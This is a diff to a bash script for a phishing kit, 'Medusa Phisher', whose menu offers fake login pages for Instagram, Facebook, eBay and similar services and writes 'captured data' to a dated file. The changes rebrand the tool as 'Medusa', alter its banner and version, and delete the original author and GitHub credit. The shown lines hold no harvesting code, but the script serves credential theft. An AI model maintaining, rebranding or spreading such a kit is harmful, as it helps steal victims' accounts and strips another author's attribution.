@@ -12,7 +12,7 @@ NC='\033[0m' # No Color
 
 # Get current date for filename
 CURRENT_DATE=$(date +"%d.%m.%Y")
-DATA_FILE="$HOME/MedusaPhisher-Phishing-Data-${CURRENT_DATE}.txt"
+DATA_FILE="$HOME/Medusa-Phishing-Data-${CURRENT_DATE}.txt"
 
 # Global variable to control the main loop
 KEEP_RUNNING=true
@@ -20,7 +20,7 @@ KEEP_RUNNING=true
 # Function to initialize data file
 init_data_file() {
     echo "==========================================" > "$DATA_FILE"
-    echo "Medusa Phisher - Captured Data" >> "$DATA_FILE"
+    echo "Medusa - Captured Data" >> "$DATA_FILE"
     echo "Date: $(date)" >> "$DATA_FILE"
     echo "Server: $server" >> "$DATA_FILE"
     echo "==========================================" >> "$DATA_FILE"
@@ -110,11 +110,7 @@ sleep 3
 
 
 
-# Medusa Phisher
 
-# Author: Adrilaw
-
-# GitHub: github.com/Adrilaw
 
 
 
@@ -267,7 +263,7 @@ echo -e "\e[1;33m"
 
 # Print menu options
 
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA PHISHER  v1.3\e[0m\n"                                
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA  v1.0\e[0m\n"
 
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m                 \n"
 
